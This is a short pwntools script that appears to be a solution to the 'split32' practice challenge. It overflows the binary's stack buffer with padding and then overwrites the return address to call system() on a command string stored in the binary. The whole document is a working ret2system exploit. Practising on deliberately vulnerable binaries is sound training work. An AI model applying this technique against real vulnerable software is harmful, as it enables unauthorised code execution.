from pwn import *

pr = process("./split32")

cat = p32(0x0804a030)
system = p32(0x804861a)

fluff = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

payload = fluff + system + cat

pr.sendline(payload)

print pr.read()
